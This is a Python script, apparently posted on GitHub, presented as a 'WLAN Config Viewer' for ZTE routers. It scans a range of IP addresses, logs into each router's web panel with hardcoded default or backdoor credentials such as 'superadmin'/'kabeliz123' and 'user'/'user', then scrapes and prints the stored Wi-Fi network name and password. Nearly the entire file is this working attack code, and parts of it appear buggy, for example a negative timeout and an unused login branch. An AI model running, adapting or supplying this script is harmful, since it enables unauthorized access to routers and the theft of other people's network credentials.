# ZTE F460 WLAN Config Viewer v2
# Code by Mugi F.
# github.com/mugi789
# For donate >> saweria.co/mugifadilah
import requests
import binascii
import codecs
from bs4 import BeautifulSoup
from prettytable import PrettyTable
print('''
 ()()                       ____ 
 (..)      \033[31mZTE F460\033[39m        /|o  |
 /\/\  \033[31mWLAN Config Viewer\033[39m /o|  o|
c\db/o.................../o_|_o_|
''')
host = input('Input IP Gateway : ')
hitung = int(host.split('.')[3])
while hitung < 256:
    try:
        ip = '.'.join(map(str, host.split(".")[:-1]+[hitung]))
        getoken = BeautifulSoup(requests.get('http://'+ip+'/', timeout=3).content, 'html.parser')
        token = str(getoken.find_all('script')[1]).split('getObj("Frm_Logintoken").value = "')[1].split('";')[0]
        kata = {
            "suportadmin",
            "kabeliz123"
        }
        for xpw in kata:
            raw = {
            "frashnum": "",
            "action": "login",
            "Frm_Logintoken": token,
            "Username": "superadmin",
            "Password": xpw
            }
            log = requests.post('http://'+ip+'/', data=raw, allow_redirects=True, timeout=1-5)
            title = BeautifulSoup(requests.get('http://'+ip).content, 'html.parser').find('title').get_text()
            if 'http://'+ip+'/start.ghtml' == log.url:
                getver = BeautifulSoup(requests.get('http://'+ip+'/template.gch', timeout=3).content, 'html.parser')
                ver = str(getver.find('div', {'id': 'e8_div1'}).find_all('td', {'id': 'Frm_SoftwareVer'})).split('>')[1].replace('</td', '')
                if 'V6.0.0P12T6' == ver:
                    hasil = PrettyTable(['IP', 'ESSID', 'PASSWORD'])
                    namawifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_essid_t.gch').text, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[98]).split('ESSID')[1].split("'")[2]
                    pswdwifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_secrity_t.gch').text, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[21]).split('KeyPassphrase')[1].split("'")[2]
                    hasil.add_row([ip, codecs.decode(binascii.hexlify(bytes(namawifi, encoding='utf-8')), 'hex').decode('utf-8'), codecs.decode(binascii.hexlify(bytes(pswdwifi, encoding='utf-8')), 'hex').decode('utf-8')])
                    print(hasil)
                elif 'V6.0.3P1T1' == ver:
                    hasil = PrettyTable(['IP', 'ESSID', 'PASSWORD'])
                    namawifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=pon_net_wlan_conf_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[101]).split("','")[1].replace("');</script>", "")
                    pswdwifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=pon_net_wlan_conf_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[26]).split("','")[1].replace("');</script>", "")
                    hasil.add_row([ip, codecs.decode(binascii.hexlify(bytes(namawifi, encoding='utf-8')), 'hex').decode('utf-8'), codecs.decode(binascii.hexlify(bytes(pswdwifi, encoding='utf-8')), 'hex').decode('utf-8')])
                    print(hasil)
                elif 'V5.0.10P4T18' == ver:
                    hasil = PrettyTable(['IP', 'ESSID', 'PASSWORD'])
                    namawifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_essid_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[83]).split("','")[1].replace("');</script>", "")
                    pswdwifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_secrity_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[21]).split("','")[1].replace("');</script>", "")
                    hasil.add_row([ip, codecs.decode(binascii.hexlify(bytes(namawifi, encoding='utf-8')), 'hex').decode('utf-8'), codecs.decode(binascii.hexlify(bytes(pswdwifi, encoding='utf-8')), 'hex').decode('utf-8')])
                    print(hasil)
                else:
                    print(log.url+' Versi '+ver+' belum tersedia')
            # ZX-F663NV3a XPON
            elif 'ZX-F663NV3a XPON' == title:
                data = {
                    "frashnum": "",
                    "action": "login",
                    "Frm_Logintoken": token,
                    "username": "user",
                    "Password": "user"
                    }
                namawifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_essid_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[83]).split("','")[1].replace("');</script>", "")
                pswdwifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_secrity_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[21]).split("','")[1].replace("');</script>", "")
                hasil.add_row([ip, codecs.decode(binascii.hexlify(bytes(namawifi, encoding='utf-8')), 'hex').decode('utf-8'), codecs.decode(binascii.hexlify(bytes(pswdwifi, encoding='utf-8')), 'hex').decode('utf-8')])
                print(hasil)
            else:
                judul = BeautifulSoup(requests.get('http://'+ip).content, 'html.parser').find('title').get_text()
                print('http://'+ip+" "+judul+"\033[31m Cek Manual\033[39m                          ")
                pass
        hitung += 1
    except IndexError:
        wajib = requests.get('http://'+ip)
        if wajib.status_code == 200:
            tipe = BeautifulSoup(wajib.content, 'html.parser').find('title').get_text()
            print('http://'+ip+" "+tipe+"\033[31m Cek Manual\033[39m                          ")
        hitung += 1
        pass
    except requests.exceptions.ConnectionError:
        print('http://'+ip+"\033[31m IP Not Found\033[39m", end='\r')
        hitung += 1
        pass
    except KeyboardInterrupt:
        print(end='\r')
        print('Bye', end='\n')
        pass
        break
# Untuk modem XSF609
    except AttributeError:
        getoken = BeautifulSoup(requests.get('http://'+ip, timeout=10).content, 'html.parser')
        token = str(getoken.find_all('script')[1]).split('getObj("Frm_Logintoken").value = "')[1].split('";')[0]
        xdata = {
            "frashnum": "",
            "action": "login",
            "Frm_Logintoken": token,
            "Username": "user",
            "Password": "user"
            }
        gas = requests.post('http://'+ip, data=xdata, allow_redirects=False, timeout=10)
        if gas.status_code == 302:
            req = requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_conf_t_user.gch')
            cari = BeautifulSoup(req.content, 'html.parser').find("form", {"name": "fSubmit"})
            passnya = str(cari).split("WPAEAPSecret")[4].split("','")[1].split("');</script>")[0]
            ssidnya = str(cari).split("ESSID")[10].split("','")[1].split("');</script>")[0]
            hasil = PrettyTable(['IP', 'ESSID', 'PASSWORD'])
            hasil.add_row([ip, codecs.decode(binascii.hexlify(bytes(ssidnya, encoding='utf-8')), 'hex').decode('utf-8'), codecs.decode(binascii.hexlify(bytes(passnya, encoding='utf-8')), 'hex').decode('utf-8')])
            print(hasil)
        hitung += 1